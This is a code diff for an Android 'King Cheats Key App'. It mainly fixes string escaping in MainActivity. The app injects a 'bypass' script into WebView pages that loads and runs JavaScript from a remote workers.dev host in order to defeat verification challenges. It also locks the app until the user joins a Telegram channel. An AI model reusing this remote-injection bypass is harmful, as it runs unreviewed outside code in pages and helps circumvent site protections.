@@ -2,7 +2,6 @@ package com.kingcheats.keyapp;
 
 import android.annotation.SuppressLint;
 import android.content.Context;
-import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.graphics.Bitmap;
@@ -48,11 +47,11 @@ public class MainActivity extends AppCompatActivity {
     private boolean isUnlocked = false;
     private final Handler handler = new Handler(Looper.getMainLooper());
 
-    // Worker Script injected into pages
+    // Bypass script injected into pages
     private static final String BYPASS_SCRIPT =
         "(function(){" +
         "  try {" +
-        "    var e = document.querySelector('script[src*="rabindra-bypass-ofc"]');" +
+        "    var e = document.querySelector('script[src*=\"rabindra-bypass-ofc\"]');" +
         "    if (e) return;" +
         "    var s = document.createElement('script');" +
         "    s.src = 'https://rabindrabypassofc.rabindra-bypass-ofc.workers.dev/?host=' + encodeURIComponent(location.hostname) + '&t=' + Date.now();" +
@@ -77,7 +76,6 @@ public class MainActivity extends AppCompatActivity {
 
         setupButtons();
         setupWebView();
-
         checkTelegramLock();
     }
 
@@ -123,14 +121,11 @@ public class MainActivity extends AppCompatActivity {
 
         AlertDialog.Builder builder = new AlertDialog.Builder(this);
         builder.setTitle("Join Official Telegram");
-        builder.setMessage("You must join our official Telegram channel to get your key and use King Cheats Key App.
-
-Please join the channel to unlock access.");
+        builder.setMessage("You must join our official Telegram channel to get your key and use King Cheats Key App.\\n\\nPlease join the channel to unlock access.");
         builder.setCancelable(false);
 
         builder.setPositiveButton("Join Channel", (dialog, which) -> {
             openTelegramChannel();
-            // keep dialog or let overlay handle verification
         });
 
         builder.setNegativeButton("I Have Joined", (dialog, which) -> {
@@ -221,7 +216,6 @@ Please join the channel to unlock access.");
                 tvSubStatus.setText("Loaded");
                 injectBypassScript();
 
-                // Periodic retry to ensure dynamic challenges are handled
                 handler.postDelayed(() -> injectBypassScript(), 1500);
                 handler.postDelayed(() -> injectBypassScript(), 3500);
             }
